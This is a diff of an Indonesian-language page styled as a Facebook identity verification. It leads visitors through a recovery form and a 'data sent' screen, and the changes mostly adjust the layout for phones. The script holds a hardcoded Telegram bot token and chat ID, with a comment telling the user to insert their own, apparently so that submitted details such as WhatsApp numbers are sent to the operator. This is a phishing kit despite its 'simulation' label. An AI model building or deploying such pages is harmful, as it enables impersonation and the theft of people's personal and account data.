@@ -2,6 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Simulasi Verifikasi Facebook</title>
   <style>
     * {
@@ -21,16 +22,16 @@
       justify-content: center;
       align-items: flex-start;
       min-height: 100vh;
-      padding-top: 60px; /* agar naik sedikit ke atas */
+      padding-top: 40px; /* naik sedikit di layar hp */
     }
 
     .box {
       background: #fff;
-      padding: 30px;
+      padding: 25px;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 450px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      width: 90%;
+      max-width: 420px;
       display: none;
       text-align: center;
     }
@@ -41,7 +42,7 @@
 
     .box img {
       width: 60px;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     h2 {
@@ -53,13 +54,13 @@
     p {
       font-size: 14px;
       color: #444;
-      margin-bottom: 25px;
+      margin-bottom: 22px;
     }
 
     .btn {
       background-color: #1877f2;
       color: #fff;
-      padding: 10px 16px;
+      padding: 10px 14px;
       font-size: 15px;
       border: none;
       border-radius: 6px;
@@ -75,15 +76,24 @@
       border-radius: 6px;
     }
 
+    /* Tampilan berhasil */
     .success h2 {
-      color: #2e7d32;
+      color: #1877f2;
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+
+    .success p {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1877f2;
     }
   </style>
 </head>
 <body>
 
   <div class="wrapper">
-    <!-- Halaman 1: Konfirmasi Identitas -->
+    <!-- Halaman 1 -->
     <div class="box active" id="step1">
       <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock">
       <h2>Harap Konfirmasi Identitas Anda</h2>
@@ -91,7 +101,7 @@
       <button class="btn" onclick="goToStep(2)">Lanjutkan</button>
     </div>
 
-    <!-- Halaman 2: Formulir -->
+    <!-- Halaman 2 -->
     <div class="box" id="step2">
       <h2>Informasi Pemulihan</h2>
       <form id="recoveryForm">
@@ -104,7 +114,7 @@
       </form>
     </div>
 
-    <!-- Halaman 3: Sukses -->
+    <!-- Halaman 3: Berhasil -->
     <div class="box success" id="step3">
       <h2>Berhasil!</h2>
       <p>Berhasil mengirim data.</p>
@@ -136,7 +146,7 @@
 📱 WhatsApp: ${whatsapp}
       `;
 
-      // Ganti token & chat ID kamu di bawah ini
+      // Ganti token dan chat ID kamu
       const telegramBotToken = "7733097714:AAFizEnWZUqtjfJxikCqoNOCzufsJTB2Vk8";
       const telegramChatId = "7228659553";
 
